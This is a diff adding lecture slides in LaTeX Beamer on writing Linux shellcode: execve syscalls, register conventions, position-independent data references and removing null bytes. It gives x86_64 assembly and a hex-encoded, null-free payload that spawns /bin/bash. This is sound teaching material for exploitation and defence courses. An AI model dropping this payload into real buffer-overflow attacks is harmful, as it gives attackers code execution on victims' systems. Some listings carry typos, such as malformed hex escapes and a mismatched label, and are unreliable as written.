@@ -1,0 +1,261 @@
+\section{Shellcoding}
+\begin{frame}[fragile]{Shellcoding}
+	\begin{block}{BOF payload}
+		\begin{itemize}
+			\item A buffer overflow exploitation ends with the execution of an arbitrary payload.
+			\item The payload is a sequence of machine code instructions.
+			\item A common way to write shellcode is to use assembly language.
+			\item Usually, the ultimate goal is to spawn a shell (hence \emph{shellcoding}):
+		\end{itemize}
+	\end{block}
+	\ccode
+	\begin{lstlisting}
+		execve("/bin/bash", ["/bin/bash"], []);
+	\end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile]{Shellcoding: Creation steps}
+	\begin{block}{Assuming direct control}
+		\begin{enumerate}
+			\item Invoke the execve syscall.
+			\item Refer the string \emph{``/bin/bash''} and the argument array.
+			\item Optimize the payload.
+			\item Perform the buffer overflow.
+		\end{enumerate}
+	\end{block}
+	\ccode
+	\begin{lstlisting}
+		execve("/bin/bash", ["/bin/bash"], []);
+	\end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile]{Shellcoding: Syscalls}
+	\subsection{Syscalls}
+	\begin{block}{Invoking a syscall}
+		\begin{itemize}
+			\item Syscalls are invokable using a numerical id.
+			\item Ids are defined into \emph{unistd\_32.h} for x86 systems and \emph{unistd\_64.h} for x86\_64 systems.
+			\item On x86\_64 systems the assembler operation \emph{syscall} execute the syscall identified by \emph{rax}.
+			\item On x86 systems the assembler operation \emph{int 80h} raises a software interrupt, which leads to the execution
+				of the syscall identified by \emph{eax}.
+		\end{itemize}
+	\end{block}
+	\acode
+	\begin{columns}[T]
+		\begin{column}{.4\textwidth}
+			\begin{lstlisting}
+				; exit(0) syscall
+				mov rdi, 0
+				mov rax, 60
+				syscall
+			\end{lstlisting}
+		\end{column}
+		\begin{column}{.4\textwidth}
+			\begin{lstlisting}
+				; exit(0) syscall
+				mov ebx, 0
+				mov eax, 1
+				int 80h
+			\end{lstlisting}
+		\end{column}
+	\end{columns}
+\end{frame}
+
+\begin{frame}[fragile,shrink]{Shellcoding: The execve syscall}
+	\ccode
+	\begin{lstlisting}
+		unistd_32.h
+		#define __NR_execve 11
+		unistd_64.h
+		#define __NR_execve 59
+		syscall.h
+		int kernel_execve( const char *filename,
+		                   const char *const argv[],
+		                   const char *const envp[]);
+	\end{lstlisting}
+	\begin{block}{man 2 execve}
+		\begin{itemize}
+			\item execve() executes  the  program  pointed to by filename.
+			\item argv is an array of argument strings passed to the new program. By
+				convention, the first of these  strings  should contain the filename.
+			\item envp is an array of strings, conventionally of the form \emph{key=value}.
+			\item Both argv and envp \textbf{must} be terminated by a NULL pointer.
+			\item On Linux, argv [or envp] can be specified as NULL, which has the same effect as specifying  this  argument as a pointer to a list containing a single NULL pointer.
+		\end{itemize}
+	\end{block}
+	\ccode
+	\begin{lstlisting}
+		execve("/bin/bash", ["/bin/bash", NULL], NULL);
+	\end{lstlisting}
+\end{frame}
+
+\begin{frame}{Shellcoding: Syscall and parameter passing}
+	\begin{block}{How to pass parameters?}
+		\begin{itemize}
+			\item Use the calling convention for syscalls!
+				\begin{description}
+					\item[x86\_64]rdi, rsi, rdx, r10, r8 and r9.
+					\item[x86]ebx, ecx, edx, esi, edi and ebp.
+				\end{description}
+			\item Other parameters go into the stack.
+			\item \emph{execve} parameters:
+				\begin{description}
+					\item[x86\_64] $rdi\implies "/bin/bash"$\\
+						$rsi\implies ["/bin/bash", NULL]$\\
+						$rdx\implies NULL$\\
+					\item[x86]$ebx \implies "/bin/bash"$\\
+						$ecx \implies ["/bin/bash", NULL]$\\
+						$edx \implies NULL$
+				\end{description}
+		\end{itemize}
+	\end{block}
+\end{frame}
+
+\begin{frame}[fragile,allowframebreaks]{Shellcoding: Data reference}
+	\subsection{Data reference}
+	\begin{block}{The reference problem}
+		\begin{itemize}
+			\item The shellcode must know the reference of \emph{``/bin/bash''}, argv and env.
+			\item The shellcode is not compiled with the program it's intended to run: it must be designed as a \emph{Position Independent Code}, i.e. the shellcode can't use absolute reference.
+			\item Therefore you must use relative addressing, but before IA-64 it was not possible.
+		\end{itemize}
+	\end{block}
+	\acode
+	\begin{lstlisting}
+		filename db '/bin/bash',0
+		; What will be the address of filename in any program?
+		mov rdi, ?
+	\end{lstlisting}
+
+	\framebreak
+
+	\begin{block}{Old IA-32 way}
+		\begin{itemize}
+			\item You use a trick: jmp just before the data location, then do a
+				call.
+			\item The call Instruction pushes the next instruction pointer onto the
+				stack, which is equal to the \emph{``/bin/bash''} address.
+		\end{itemize}
+	\end{block}
+	\acode
+	\begin{lstlisting}
+		jmp filename
+		run:
+		  pop ebx ; ebx now contains "/bin/bash" reference
+		  ; ...
+		filename:
+		  call run
+		  db '/bin/bash',0
+	\end{lstlisting}
+	\begin{block}{New IA-64 way}
+		\begin{itemize}
+			\item IA-64 introduces the RIP relative addressing.
+			\item \emph{[rel filename]} becomes \emph{[rip + offset]}
+		\end{itemize}
+	\end{block}
+	\acode
+	\begin{lstlisting}
+		lea rdi, [rel message] ; now rdi contains
+		                       ; the string reference
+		; ...
+
+		filename db '/bin/bash',0
+	\end{lstlisting}
+	\begin{block}{Generic Way}
+		\begin{itemize}
+			\item You can push the string in hex format into the stack.
+			\item The stack pointer is then the string reference.
+		\end{itemize}
+	\end{block}
+	\acode
+	\begin{lstlisting}
+		push 0x00000068 ; 0x00, 'h'
+		push 0x7361622f ; 'sab/'
+		push 0x6e69622f ; 'nib/'
+		mov ebx, esp ; now ebx contains the string reference
+		; ...
+	\end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile, allowframebreaks]{Shellcode: first attempt}
+	\acode
+	\begin{lstlisting}
+		bits 64
+
+		lea rdi, [rel filename] ; filename
+		lea rsi, [rel args] ; argv
+		mov rdx, 0 ; envp
+
+		mov [rel args], rdi ; argv[0] <- filename
+		mov [rel args+8], rdx ; argv[1] <- null
+
+		mov rax, 59
+		syscall
+
+		filename db '/bin/bash',0
+		args db 16
+	\end{lstlisting}
+	\begin{lstlisting}
+		\x48\x8d\x3d\x21\x00\x00\x00\x48\x\x8d\x35\x24\x00\x00
+		\x00\xba\x00\x00\x00\x00\x48\x89\x3d\x18\x00\x\x00\x00
+		\x48\x89\x15\x19\x00\x00\x00\xb8\x3b\x00\x00\x00\x0f
+		\x05\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x00\x01\x00
+		\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00
+	\end{lstlisting}
+	\begin{itemize}
+		\item \alert{Warning: zero-byte presence!}
+		\item Often shellcode payload are red as string.
+		\item C strings are null-terminated array of chars.
+		\item The vulnerable program will process only the first five bytes!
+	\end{itemize}
+\end{frame}
+
+\begin{frame}{Shellcode: Zero-bytes problem}
+	\subsection{Zero-bytes problem}
+	\begin{block}{Zero-bytes presence is caused by data and addresses}
+		\begin{itemize}
+			\item \emph{mov rax, 11h} is equivalent to \emph{mov rax, 0000000000000011h}.
+			\item \emph{lea rax, [rel message]} is equivalent to \emph{lea rax, [rip + 0000\ldots{}xxh]}.
+			\item \emph{execve}, for instance, requires a null terminated string and some null parameters.
+		\end{itemize}
+	\end{block}
+	\begin{block}{Solutions}
+		\begin{itemize}
+			\item Use \emph{xor} operation to zero a register.
+			\item Use smaller registers (e.g.: rax $\rightarrow$ eax $\rightarrow$ ax $\rightarrow$ [ah,al])
+			\item Use \emph{add} operation: immediate operator is not expanded.
+			\item Place non-null marker and substitute them inside the code.
+			\item Make a relative reference offset negative.
+		\end{itemize}
+	\end{block}
+\end{frame}
+
+\begin{frame}[fragile, allowframebreaks]{Shellcode: second attempt}
+	\acode
+	\begin{lstlisting}
+		bits 64
+		jmp code
+		filename db '/bin/bash','n' ; 'n' is the marker
+		args db 16
+		code:
+		  lea rdi, [rel filename] ; negative offset
+		  lea rsi, [rel args] ; negative offset
+		  xor rdx, rdx ; zeros rdx
+		  mov [rel filename+10], dl ; zeros the marker 
+		  mov [rel args], rdi
+		  mov [rel args+8], rdx
+		  xor rax,rax ; zeros rax
+		  mov al, 59 ; uses smaller register
+		  syscall
+	\end{lstlisting}
+	\begin{lstlisting}
+		\xeb\x0b\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x6e
+		\x10\x48\x8d\x3d\xee\xff\xff\xff\x48\x8d\x35\xf1
+		\xff\xff\xff\x48\x31\xd2\x88\x15\xe8\xff\xff\xff
+		\x48\x89\x3d\xe1\xff\xff\xff\x48\x89\x15\xe2\xff
+		\xff\xff\x48\x31\xc0\xb0\x3b\x0f\x05
+	\end{lstlisting}
+	\begin{itemize}
+		\item Zero-bytes eliminated.
+	\end{itemize}
+\end{frame}
